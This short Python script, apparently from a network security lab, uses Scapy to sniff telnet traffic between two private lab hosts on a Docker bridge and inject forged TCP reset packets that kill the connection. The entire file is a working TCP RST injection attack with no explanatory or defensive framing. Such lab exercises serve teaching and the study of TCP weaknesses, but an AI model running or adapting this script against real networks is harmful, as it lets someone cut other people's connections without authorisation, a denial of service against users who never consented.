#!/usr/bin/python3

from scapy.all import *

def spoof(pkt):
    old_tcp = pkt[TCP]
    old_ip = pkt[IP]
    
    ip = IP(src=old_ip.dst, dst=old_ip.src)
    tcp = TCP(sport=old_tcp.dport, dport=old_tcp.sport, flags="R", seq=old_tcp.ack)
    
    spoof_pkt = ip/tcp
    ls(spoof_pkt)
    send(spoof_pkt, verbose=0)
    
my_filter = "tcp and src host 10.9.0.7 and dst host 10.9.0.6 and src port 23"

sniff(iface="br-82e939624594", filter=my_filter, prn=spoof)
